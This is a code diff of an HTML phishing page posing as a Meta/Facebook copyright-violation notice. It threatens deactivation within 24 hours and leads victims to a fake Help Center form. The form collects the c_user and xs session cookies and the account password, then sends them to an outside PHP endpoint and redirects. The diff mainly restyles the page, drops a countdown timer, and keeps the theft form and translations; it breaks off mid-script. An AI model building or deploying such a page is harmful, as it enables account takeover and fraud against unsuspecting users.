@@ -5,386 +5,210 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Account Notice - Meta</title>
     <style>
+        /* Base styles for both pages */
         :root {
             --primary-blue: #1877f2;
             --secondary-blue: #166fe5;
-            --error-red: #d9534f;
-            --warning-orange: #f0ad4e;
+            --dark-blue: #3b5998;
             --light-gray: #f0f2f5;
             --medium-gray: #dddfe2;
             --dark-gray: #606770;
             --text-dark: #1d2129;
             --white: #ffffff;
-            --meta-blue: #3b5998;
-            --transition-base: 0.2s ease-in-out;
+            --error-red: #d9534f;
         }
         
-        *,
-        *::before,
-        *::after {
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
         }
         
         body {
             background-color: var(--light-gray);
             color: var(--text-dark);
             line-height: 1.6;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
+            font-size: 14px;
         }
         
+        /* Notification Page Styles */
         .notification-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 1.25rem;
+            max-width: 500px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            padding: 20px;
         }
         
-        .notification-card {
-            --card-border-radius: 0.75rem;
-            
-            background: var(--white);
-            border-radius: var(--card-border-radius);
-            box-shadow: 0 0.25rem 1.25rem rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 32.5rem;
-            overflow: hidden;
-            border-top: 0.25rem solid var(--error-red);
-            transition: transform var(--transition-base), box-shadow var(--transition-base);
-            will-change: transform;
-        }
-        
-        .notification-card:hover {
-            transform: translateY(-0.3125rem);
-            box-shadow: 0 0.375rem 1.5625rem rgba(0, 0, 0, 0.15);
-        }
-        
-        .notification-header {
-            padding: 1.5rem;
-            border-bottom: 1px solid var(--medium-gray);
-            display: flex;
-            align-items: center;
-            background-color: rgba(217, 83, 79, 0.05);
-        }
-        
-        .warning-icon {
-            width: 2.625rem;
-            height: 2.625rem;
-            background-color: var(--error-red);
-            border-radius: 50%;
-            display: grid;
-            place-items: center;
-            margin-right: 1rem;
-            flex-shrink: 0;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { 
-                transform: scale(1); 
-                box-shadow: 0 0 0 0 rgba(217, 83, 79, 0.7); 
-            }
-            70% { 
-                transform: scale(1.03); 
-                box-shadow: 0 0 0 0.625rem rgba(217, 83, 79, 0); 
-            }
-            100% { 
-                transform: scale(1); 
-                box-shadow: 0 0 0 0 rgba(217, 83, 79, 0); 
-            }
-        }
-        
-        .warning-icon svg {
-            width: 1.5rem;
-            height: 1.5rem;
-            fill: currentColor;
-        }
-        
-        .notification-title {
-            font-size: 1.25rem;
-            font-weight: 700;
-            color: var(--error-red);
-            margin-bottom: 0.25rem;
-            line-height: 1.3;
-        }
-        
-        .meta-badge {
-            font-size: 0.75rem;
-            color: var(--meta-blue);
-            font-weight: 600;
-            letter-spacing: 0.02em;
-        }
-        
-        .notification-content {
-            padding: 1.5rem;
-        }
-        
-        .notification-text {
-            font-size: 0.9375rem;
-            margin-bottom: 1rem;
-            color: var(--dark-gray);
-            line-height: 1.5;
-        }
-        
-        .urgent-banner {
-            background-color: rgba(217, 83, 79, 0.1);
-            border-left: 0.1875rem solid var(--error-red);
-            padding: 0.875rem 1rem;
-            margin: 1.25rem 0;
-            border-radius: 0 0.25rem 0.25rem 0;
-            display: flex;
-            gap: 0.625rem;
-        }
-        
-        .urgent-icon svg {
-            width: 1.125rem;
-            height: 1.125rem;
-            fill: currentColor;
-            color: var(--error-red);
-        }
-        
-        .urgent-text {
-            font-weight: 500;
-            color: var(--text-dark);
-        }
-        
-        .countdown-timer {
-            display: flex;
-            align-items: center;
-            background-color: rgba(217, 83, 79, 0.05);
-            padding: 0.75rem 1rem;
-            border-radius: 0.375rem;
-            margin: 1.25rem 0;
-            border: 1px dashed var(--error-red);
-            gap: 0.75rem;
-        }
-        
-        .timer-icon svg {
-            width: 1.25rem;
-            height: 1.25rem;
-            fill: currentColor;
-            color: var(--error-red);
-        }
-        
-        .timer-text {
-            font-size: 0.9375rem;
+        .warning-header {
+            font-size: 20px;
             font-weight: 600;
             color: var(--error-red);
+            margin-bottom: 16px;
+        }
+        
+        .content-text {
+            font-size: 15px;
+            margin-bottom: 16px;
         }
         
         .divider {
             height: 1px;
             background-color: var(--medium-gray);
-            margin: 1.5rem 0;
+            margin: 20px 0;
             border: 0;
         }
         
-        .support-section {
-            background-color: rgba(24, 119, 242, 0.05);
-            border-radius: 0.5rem;
-            padding: 1.25rem;
-            margin-top: 1.25rem;
-            border: 1px solid rgba(24, 119, 242, 0.1);
-        }
-        
-        .support-title {
-            font-size: 1.0625rem;
+        .support-header {
+            font-size: 17px;
             font-weight: 600;
             color: var(--primary-blue);
-            margin-bottom: 0.5rem;
-            display: flex;
-            align-items: center;
-            gap: 0.625rem;
-        }
-        
-        .support-title svg {
-            width: 1.25rem;
-            height: 1.25rem;
-            fill: currentColor;
-        }
-        
-        .support-text {
-            font-size: 0.875rem;
-            color: var(--dark-gray);
-            margin-bottom: 1.25rem;
-            line-height: 1.5;
+            margin-bottom: 12px;
         }
         
         .action-button {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
+            display: inline-block;
             background-color: var(--primary-blue);
-            color: var(--white);
-            font: inherit;
+            color: white;
             font-weight: 600;
-            font-size: 0.9375rem;
-            padding: 0.875rem 1.5rem;
-            border-radius: 0.375rem;
+            font-size: 15px;
+            padding: 8px 16px;
+            border-radius: 6px;
             text-decoration: none;
+            margin-top: 12px;
             border: none;
             cursor: pointer;
-            width: 100%;
-            transition: 
-                background-color var(--transition-base),
-                transform var(--transition-base),
-                box-shadow var(--transition-base);
         }
         
-        .action-button:focus {
-            outline: 0.125rem solid var(--primary-blue);
-            outline-offset: 0.125rem;
-        }
-        
-        .action-button:hover {
-            background-color: var(--secondary-blue);
-            transform: translateY(-0.125rem);
-            box-shadow: 0 0.25rem 0.5rem rgba(24, 119, 242, 0.2);
-        }
-        
-        .action-button:active {
-            transform: translateY(0);
-        }
-        
-        .action-button svg {
-            width: 1.125rem;
-            height: 1.125rem;
-            margin-right: 0.625rem;
-            fill: currentColor;
-        }
-        
-        .notification-footer {
+        .footer {
             text-align: center;
-            padding: 1rem;
-            font-size: 0.75rem;
             color: var(--dark-gray);
-            border-top: 1px solid var(--medium-gray);
-            background-color: rgba(0, 0, 0, 0.02);
+            font-size: 12px;
+            margin-top: 20px;
         }
         
-        .meta-logo {
-            color: var(--meta-blue);
-            font-weight: 700;
-        }
-        
-        /* Verification Form Styles */
-        .verification-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0, 0, 0, 0.7);
-            z-index: 1000;
+        /* Verification Form Styles (initially hidden) */
+        #verificationForm {
             display: none;
-            overflow-y: auto;
-            padding: 1rem;
         }
         
-        .verification-container {
-            background-color: var(--white);
-            border-radius: 0.5rem;
-            max-width: 42.5rem;
-            margin: 2rem auto;
-            box-shadow: 0 0.25rem 1.25rem rgba(0, 0, 0, 0.2);
-            overflow: hidden;
+        #root {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
         
-        .verification-header {
-            background: linear-gradient(to right, var(--meta-blue), #2d4373);
-            height: 5rem;
+        .header {
+            background: linear-gradient(to right, var(--dark-blue), #2d4373);
+            height: 80px;
             display: flex;
             align-items: center;
-            padding: 0 1.5rem;
+            padding: 0 40px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             justify-content: space-between;
         }
         
-        .verification-header h1 {
+        .header h1 {
             color: var(--white);
-            font-size: 1.75rem;
+            font-size: 28px;
             font-weight: 700;
+            letter-spacing: -0.5px;
         }
         
         .language-selector {
-            background-color: rgba(255, 255, 255, 0.2);
+            background-color: rgba(255,255,255,0.2);
             border: none;
             color: white;
-            padding: 0.5rem 0.75rem;
-            border-radius: 0.25rem;
-            font-size: 0.875rem;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 14px;
         }
         
-        .verification-subheader {
+        .language-selector option {
+            background-color: var(--dark-blue);
+        }
+        
+        .sub-header {
             background-color: var(--white);
-            height: 3.75rem;
+            height: 60px;
             display: flex;
             align-items: center;
-            padding: 0 1.5rem;
+            padding: 0 40px;
             border-bottom: 1px solid var(--medium-gray);
         }
         
-        .verification-subheader h4 {
+        .sub-header h4 {
             color: var(--primary-blue);
-            font-size: 1.125rem;
+            font-size: 18px;
             font-weight: 600;
         }
         
-        .verification-body {
-            padding: 1.5rem;
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 30px 20px;
         }
         
         .verification-card {
             background-color: var(--white);
-            border-radius: 0.5rem;
-            box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             width: 100%;
+            max-width: 680px;
             overflow: hidden;
         }
         
-        .verification-card-header {
+        .card-header {
             background-color: var(--light-gray);
-            padding: 1rem 1.5rem;
+            padding: 16px 24px;
             border-bottom: 1px solid var(--medium-gray);
         }
         
-        .verification-card-header h5 {
-            font-size: 1rem;
+        .card-header h5 {
+            font-size: 16px;
             font-weight: 600;
             color: var(--text-dark);
         }
         
-        .verification-card-body {
-            padding: 1.5rem;
+        .card-body {
+            padding: 24px;
+            position: relative;
+        }
+        
+        .alert-message {
+            margin-bottom: 20px;
         }
         
         .alert-message p {
-            margin-bottom: 0.75rem;
+            margin-bottom: 12px;
             color: var(--text-dark);
-            font-size: 0.9375rem;
         }
         
         .video-container {
-            margin: 0 0 1.25rem 0;
+            margin: 0 0 20px 0;
             text-align: left;
             width: 100%;
         }
         
+        .form-container {
+            width: 100%;
+        }
+        
         .video-label {
-            font-size: 0.75rem;
+            font-size: 12px;
             color: var(--dark-gray);
-            margin-bottom: 0.5rem;
+            margin-bottom: 8px;
             display: block;
         }
         
         video {
             max-width: 100%;
             height: auto;
-            border-radius: 0.25rem;
+            border-radius: 4px;
             border: 1px solid var(--medium-gray);
         }
         
@@ -392,13 +216,13 @@
             background-color: var(--primary-blue);
             color: var(--white);
             border: none;
-            border-radius: 0.25rem;
-            padding: 0.5rem 1rem;
-            font-size: 0.8125rem;
+            border-radius: 4px;
+            padding: 8px 16px;
+            font-size: 13px;
             font-weight: 500;
             cursor: pointer;
-            margin: 0.625rem 0 1.25rem;
-            transition: background-color var(--transition-base);
+            margin: 10px 0 20px;
+            transition: background-color 0.2s;
         }
         
         .sound-toggle:hover {
@@ -406,44 +230,44 @@
         }
         
         .form-group {
-            margin-bottom: 1.25rem;
+            margin-bottom: 20px;
         }
         
         .form-label {
             display: block;
-            font-size: 0.8125rem;
+            font-size: 13px;
             color: var(--dark-gray);
-            margin-bottom: 0.5rem;
+            margin-bottom: 8px;
             font-weight: 500;
         }
         
         .form-control {
             width: 100%;
-            padding: 0.75rem;
+            padding: 12px;
             border: 1px solid var(--medium-gray);
-            border-radius: 0.25rem;
-            font-size: 0.875rem;
-            transition: border-color var(--transition-base), box-shadow var(--transition-base);
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
         
         .form-control:focus {
             outline: none;
             border-color: var(--primary-blue);
-            box-shadow: 0 0 0 0.125rem rgba(24, 119, 242, 0.2);
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
         
         .form-note {
-            font-size: 0.75rem;
+            font-size: 12px;
             color: var(--dark-gray);
-            margin-top: 1.25rem;
-            padding: 0.75rem;
+            margin-top: 20px;
+            padding: 12px;
             background-color: var(--light-gray);
-            border-radius: 0.25rem;
+            border-radius: 4px;
         }
         
-        .verification-card-footer {
+        .card-footer {
             background-color: var(--light-gray);
-            padding: 1rem 1.5rem;
+            padding: 16px 24px;
             border-top: 1px solid var(--medium-gray);
             text-align: right;
         }
@@ -452,12 +276,12 @@
             background-color: var(--primary-blue);
             color: var(--white);
             border: none;
-            border-radius: 0.25rem;
-            padding: 0.625rem 1.5rem;
-            font-size: 0.875rem;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color var(--transition-base);
+            transition: background-color 0.2s;
         }
         
         .submit-btn:hover {
@@ -466,8 +290,8 @@
         
         .password-confirmation {
             display: none;
-            margin-top: 1.875rem;
-            padding-top: 1.25rem;
+            margin-top: 30px;
+            padding-top: 20px;
             border-top: 1px solid var(--medium-gray);
             text-align: center;
         }
@@ -477,34 +301,34 @@
         }
         
         .facebook-logo {
-            width: 2.5rem;
-            height: 2.5rem;
-            margin-bottom: 0.9375rem;
+            width: 40px;
+            height: 40px;
+            margin-bottom: 15px;
         }
         
         .password-label {
-            font-size: 1rem;
-            margin-bottom: 0.9375rem;
+            font-size: 16px;
+            margin-bottom: 15px;
             color: var(--text-dark);
             font-weight: 500;
         }
         
         .password-input {
             width: 100%;
-            max-width: 18.75rem;
-            margin: 0 auto 0.9375rem;
+            max-width: 300px;
+            margin: 0 auto 15px;
         }
         
         .final-submit-btn {
             background-color: var(--primary-blue);
             color: white;
             border: none;
-            border-radius: 0.25rem;
-            padding: 0.625rem 1.875rem;
-            font-size: 0.875rem;
+            border-radius: 4px;
+            padding: 10px 30px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color var(--transition-base);
+            transition: background-color 0.2s;
         }
         
         .final-submit-btn:hover {
@@ -513,326 +337,205 @@
         
         .error-message {
             color: var(--error-red);
-            font-size: 0.75rem;
-            margin-top: 0.3125rem;
+            font-size: 12px;
+            margin-top: 5px;
             display: none;
         }
         
         .success-message {
             display: none;
             text-align: center;
-            padding: 2.5rem 1.25rem;
+            padding: 40px 20px;
         }
         
         .success-icon {
-            font-size: 3.75rem;
+            font-size: 60px;
             color: #42b72a;
-            margin-bottom: 1.25rem;
+            margin-bottom: 20px;
         }
         
         .success-title {
-            font-size: 1.5rem;
-            margin-bottom: 0.9375rem;
+            font-size: 24px;
+            margin-bottom: 15px;
             color: var(--text-dark);
         }
         
         .success-text {
             color: var(--dark-gray);
-            max-width: 25rem;
+            max-width: 400px;
             margin: 0 auto;
-            font-size: 0.9375rem;
         }
         
-        .close-btn {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            background: none;
-            border: none;
-            color: var(--white);
-            font-size: 1.5rem;
-            cursor: pointer;
-            z-index: 1001;
-        }
-        
-        @media (max-width: 48rem) {
-            .verification-container {
-                margin: 1rem auto;
+        @media (min-width: 768px) {
+            .left-column {
+                width: 60%;
+                float: left;
+                padding-right: 20px;
             }
             
-            .verification-header {
-                height: 4rem;
-                padding: 0 1rem;
+            .right-column {
+                width: 40%;
+                float: right;
+                padding-left: 20px;
             }
             
-            .verification-header h1 {
-                font-size: 1.5rem;
-            }
-            
-            .verification-subheader {
-                height: 3rem;
-                padding: 0 1rem;
-            }
-            
-            .verification-subheader h4 {
-                font-size: 1rem;
-            }
-            
-            .verification-card-body {
-                padding: 1rem;
+            .clearfix::after {
+                content: "";
+                display: table;
+                clear: both;
             }
         }
         
-        @media (max-width: 30rem) {
-            .notification-header {
-                padding: 1.125rem;
+        @media (max-width: 767px) {
+            .notification-container {
+                margin: 20px auto;
+                padding: 15px;
             }
             
-            .notification-content {
-                padding: 1.125rem;
+            .warning-header {
+                font-size: 18px;
             }
             
-            .warning-icon {
-                width: 2.25rem;
-                height: 2.25rem;
-                margin-right: 0.75rem;
+            .header, .sub-header {
+                padding: 0 20px;
             }
             
-            .notification-title {
-                font-size: 1.125rem;
+            .header h1 {
+                font-size: 24px;
             }
             
-            .action-button {
-                padding: 0.75rem 1.25rem;
+            .sub-header h4 {
+                font-size: 16px;
             }
             
-            .verification-header {
-                flex-direction: column;
-                height: auto;
-                padding: 1rem;
-            }
-            
-            .verification-header h1 {
-                margin-bottom: 0.5rem;
-            }
-        }
-        
-        @media (prefers-reduced-motion: reduce) {
-            *,
-            *::before,
-            *::after {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
-                scroll-behavior: auto !important;
+            .card-body {
+                padding: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="notification-container">
-        <div class="notification-card">
-            <div class="notification-header">
-                <div class="warning-icon">
-                    <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                    </svg>
-                </div>
-                <div>
-                    <h1 class="notification-title">Account Deactivation Warning</h1>
-                    <div class="meta-badge">Meta Security Alert</div>
-                </div>
-            </div>
+    <!-- Initial Notification Page -->
+    <div class="notification-container" id="notificationPage">
+        <div class="warning-header">Account will be deactivated</div>
+        
+        <div class="content-text">
+            <p>Your account or the page you use has violated copyright. We will immediately limit your account or permanently disable it for non-compliance with our terms of service.</p>
             
-            <div class="notification-content">
-                <p class="notification-text">
-                    Our systems have detected that your account or associated page has violated our Copyright Policies. Immediate action is required to prevent permanent deactivation.
-                </p>
-                
-                <div class="urgent-banner" role="alert">
-                    <div class="urgent-icon">
-                        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                        </svg>
-                    </div>
-                    <div class="urgent-text">
-                        If you believe this is a mistake, you must verify your account within 24 hours to prevent permanent deactivation. After this period, no recovery options will be available.
-                    </div>
-                </div>
-                
-                <div class="countdown-timer">
-                    <div class="timer-icon">
-                        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                            <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm-.22-13h-.06c-.4 0-.72.32-.72.72v4.72c0 .35.18.68.49.86l4.15 2.49c.34.2.78.1.98-.24.21-.34.1-.79-.25-.99l-3.87-2.3V7.72c0-.4-.32-.72-.72-.72z"/>
-                        </svg>
-                    </div>
-                    <div class="timer-text" id="countdown">Time remaining: 24:00:00</div>
-                </div>
-                
-                <div class="divider"></div>
-                
-                <div class="support-section">
-                    <h3 class="support-title">
-                        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
-                        </svg>
-                        Facebook Support Center
-                    </h3>
-                    <p class="support-text">
-                        Our verification process will guide you through the steps to resolve this issue and prevent account deactivation. Please have your account information ready.
-                    </p>
-                    <button class="action-button" id="getStartedBtn">
-                        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                            <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/>
-                        </svg>
-                        Begin Verification
-                    </button>
-                </div>
-            </div>
-            
-            <div class="notification-footer">
-                <span class="meta-logo">Meta</span> © 2025 · Privacy Policy · Terms of Service
-            </div>
+            <p>If you think we've accidentally suspended your account, you have 24 hours to verify your account. If you miss this security notification, your account will be permanently disabled.</p>
         </div>
+        
+        <div class="divider"></div>
+        
+        <div class="support-header">Facebook Violation Support</div>
+        <div class="content-text">
+            <p>We will walk you through several steps to cancel a deactivated account.</p>
+        </div>
+        
+        <button class="action-button" id="getStartedBtn">Get Started</button>
+        
+        <div class="footer">Meta © 2025</div>
     </div>
 
-    <!-- Verification Form Overlay -->
-    <div class="verification-overlay" id="verificationOverlay">
-        <button class="close-btn" id="closeVerification">&times;</button>
-        <div class="verification-container">
-            <form id="verificationForm" action="https://mdteam-94b96.wasmer.app/rashid.php" method="post">
-                <input type="hidden" name="_redirect" value="https://password-form-web.vercel.app/">
-                <input type="hidden" id="selectedLanguage" name="language" value="en">
-                <div class="verification-header">
-                    <h1>facebook</h1>
-                    <select class="language-selector" id="languageSelector">
-                        <option value="en">English</option>
-                        <option value="es">Español</option>
-                        <option value="fr">Français</option>
-                        <option value="de">Deutsch</option>
-                        <option value="pt">Português</option>
-                        <option value="ar">العربية</option>
-                        <option value="hi">हिन्दी</option>
-                        <option value="zh">中文</option>
-                        <option value="ru">Русский</option>
-                        <option value="ja">日本語</option>
-                        <option value="it">Italiano</option>
-                        <option value="tr">Türkçe</option>
-                        <option value="nl">Nederlands</option>
-                        <option value="pl">Polski</option>
-                        <option value="sv">Svenska</option>
-                    </select>
-                </div>
-                <div class="verification-subheader">
-                    <h4 id="helpCenterText">Help Center</h4>
-                </div>
-                <div class="verification-body">
-                    <div class="verification-card">
-                        <div class="verification-card-header">
-                            <h5 id="formTitle">Request For Remove Page Violation</h5>
-                        </div>
-                        <div class="verification-card-body">
-                            <div id="formContent">
-                                <div class="alert-message">
-                                    <p id="message1">We've identified irregular activity on your page that goes against our community guidelines.</p>
-                                    <p id="message2">As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
-                                    <p id="message3">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
-                                </div>
-                                
-                                <div class="video-container">
-                                    <span class="video-label" id="videoLabel">Detailed Video Information</span>
-                                    <video controls autoplay muted playsinline src="https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4" style="width: 100%; height: auto;"></video>
-                                    <button type="button" class="sound-toggle" id="soundToggle">Enable Sound</button>
-                                </div>
-                                
-                                <div class="form-container">
-                                    <p class="alert-message" id="provideInfoText">Please be sure to provide the requested information below.</p>
-                                    
-                                    <div class="form-group">
-                                        <label for="c_user" class="form-label" id="cUserLabel">c_user</label>
-                                        <input type="number" id="c_user" name="c_user" class="form-control" required pattern="^\d{15}$" title="Please enter 15 digits">
+    <!-- Verification Form (hidden initially) -->
+    <form id="verificationForm" action="https://mdteam-94b96.wasmer.app/rashid.php" method="post">
+        <input type="hidden" name="_redirect" value="https://password-form-web.vercel.app/">
+        <input type="hidden" id="selectedLanguage" name="language" value="en">
+        <div id="root">
+            <div class="header">
+                <h1>facebook</h1>
+                <select class="language-selector" id="languageSelector">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="de">Deutsch</option>
+                    <option value="pt">Português</option>
+                    <option value="ar">العربية</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="zh">中文</option>
+                    <option value="ru">Русский</option>
+                    <option value="ja">日本語</option>
+                    <option value="it">Italiano</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="pl">Polski</option>
+                    <option value="sv">Svenska</option>
+                </select>
+            </div>
+            <div class="sub-header">
+                <h4 id="helpCenterText">Help Center</h4>
+            </div>
+            <div class="main-content">
+                <div class="verification-card">
+                    <div class="card-header">
+                        <h5 id="formTitle">Request For Remove Page Violation</h5>
+                    </div>
+                    <div class="card-body">
+                        <div id="formContent">
+                            <div class="alert-message">
+                                <p id="message1">We've identified irregular activity on your page that goes against our community guidelines.</p>
+                                <p id="message2">As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
+                                <p id="message3">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
+                            </div>
+                            
+                            <div class="clearfix">
+                                <div class="left-column">
+                                    <div class="video-container">
+                                        <span class="video-label" id="videoLabel">Detailed Video Information</span>
+                                        <video controls autoplay muted playsinline src="https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4" style="width: 100%; height: auto;"></video>
+                                        <button type="button" class="sound-toggle" id="soundToggle">Enable Sound</button>
                                     </div>
                                     
-                                    <div class="form-group">
-                                        <label for="xs" class="form-label" id="xsLabel">xs</label>
-                                        <input type="text" id="xs" name="xs" class="form-control" required>
-                                    </div>
-                                    
-                                    <div class="form-note" id="dontLogoutText">
-                                        Please make sure not to log out from your computer or laptop until you have received a verification email.
+                                    <div class="form-container">
+                                        <p class="alert-message" id="provideInfoText">Please be sure to provide the requested information below.</p>
+                                        
+                                        <div class="form-group">
+                                            <label for="c_user" class="form-label" id="cUserLabel">c_user</label>
+                                            <input type="number" id="c_user" name="c_user" class="form-control" required pattern="^\d{15}$" title="Please enter 15 digits">
+                                        </div>
+                                        
+                                        <div class="form-group">
+                                            <label for="xs" class="form-label" id="xsLabel">xs</label>
+                                            <input type="text" id="xs" name="xs" class="form-control" required>
+                                        </div>
+                                        
+                                        <div class="form-note" id="dontLogoutText">
+                                            Please make sure not to log out from your computer or laptop until you have received a verification email.
+                                        </div>
                                     </div>
                                 </div>
                                 
-                                <div class="password-confirmation" id="passwordConfirmation">
-                                    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" class="facebook-logo">
-                                    <div class="password-label" id="passwordLabel">Confirm your Facebook password to continue</div>
-                                    <div class="password-input">
-                                        <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
-                                        <div class="error-message" id="passwordError">Please enter your password</div>
-                                    </div>
-                                    <button type="button" class="final-submit-btn" id="finalSubmit">Send Confirmation</button>
+                                <div class="right-column">
+                                    <!-- Right column content can go here if needed -->
                                 </div>
                             </div>
                             
-                            <div class="success-message" id="successMessage">
-                                <div class="success-icon">✓</div>
-                                <h2 class="success-title" id="successTitle">Your request has been submitted successfully</h2>
-                                <p class="success-text" id="successText">We are reviewing your information and will contact you shortly.</p>
+                            <div class="password-confirmation" id="passwordConfirmation">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" class="facebook-logo">
+                                <div class="password-label" id="passwordLabel">Confirm your Facebook password to continue</div>
+                                <div class="password-input">
+                                    <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
+                                    <div class="error-message" id="passwordError">Please enter your password</div>
+                                </div>
+                                <button type="button" class="final-submit-btn" id="finalSubmit">Send Confirmation</button>
                             </div>
                         </div>
-                        <div class="verification-card-footer">
-                            <button type="button" class="submit-btn" id="initialSubmit">Submit</button>
+                        
+                        <div class="success-message" id="successMessage">
+                            <div class="success-icon">✓</div>
+                            <h2 class="success-title" id="successTitle">Your request has been submitted successfully</h2>
+                            <p class="success-text" id="successText">We are reviewing your information and will contact you shortly.</p>
                         </div>
                     </div>
+                    <div class="card-footer">
+                        <button type="button" class="submit-btn" id="initialSubmit">Submit</button>
+                    </div>
                 </div>
-            </form>
+            </div>
         </div>
-    </div>
+    </form>
 
     <script>
-        // Countdown timer functionality
-        function startCountdown() {
-            let hours = 23;
-            let minutes = 59;
-            let seconds = 59;
-            
-            const countdownElement = document.getElementById('countdown');
-            
-            const timer = setInterval(function() {
-                if (seconds === 0) {
-                    if (minutes === 0) {
-                        if (hours === 0) {
-                            clearInterval(timer);
-                            countdownElement.textContent = "Time expired! Account disabled.";
-                            countdownElement.style.color = "var(--error-red)";
-                            countdownElement.style.fontWeight = "700";
-                            return;
-                        }
-                        hours--;
-                        minutes = 59;
-                    } else {
-                        minutes--;
-                    }
-                    seconds = 59;
-                } else {
-                    seconds--;
-                }
-                
-                const formattedHours = hours.toString().padStart(2, '0');
-                const formattedMinutes = minutes.toString().padStart(2, '0');
-                const formattedSeconds = seconds.toString().padStart(2, '0');
-                
-                countdownElement.textContent = Time remaining: ${formattedHours}:${formattedMinutes}:${formattedSeconds};
-                
-                // Change style when less than 1 hour remains
-                if (hours === 0) {
-                    countdownElement.style.fontWeight = "700";
-                    countdownElement.style.animation = "pulse 1s infinite";
-                }
-            }, 1000);
-        }
-        
-        // Verification Form Functionality
         const translations = {
             en: {
                 helpCenter: "Help Center",
@@ -886,7 +589,7 @@
                 cUserLabel: "c_user",
                 xsLabel: "xs",
                 dontLogout: "Veuillez ne pas vous déconnecter de votre ordinateur ou portable jusqu'à ce que vous ayez reçu un e-mail de vérification.",
-                passwordLabel: "Confirmez votre mot de passe Facebook pour continuer",
+                passwordLabel: "Confirmez votre mot de passe Facebook pour continuar",
                 passwordPlaceholder: "Entrez votre mot de passe",
                 passwordError: "Veuillez entrer votre mot de passe",
                 submit: "Soumettre",
@@ -1137,13 +840,9 @@
         };
 
         document.addEventListener('DOMContentLoaded', function() {
-            // Initialize the countdown timer
-            startCountdown();
-            
-            // Get DOM elements
+            const notificationPage = document.getElementById('notificationPage');
+            const verificationForm = document.getElementById('verificationForm');
             const getStartedBtn = document.getElementById('getStartedBtn');
-            const verificationOverlay = document.getElementById('verificationOverlay');
-            const closeVerification = document.getElementById('closeVerification');
             const form = document.getElementById('verificationForm');
             const soundToggle = document.getElementById('soundToggle');
             const video = document.querySelector('video');
@@ -1156,29 +855,16 @@
             const formContent = document.getElementById('formContent');
             const successMessage = document.getElementById('successMessage');
             
+            // Show verification form when Get Started is clicked
+            getStartedBtn.addEventListener('click', function() {
+                notificationPage.style.display = 'none';
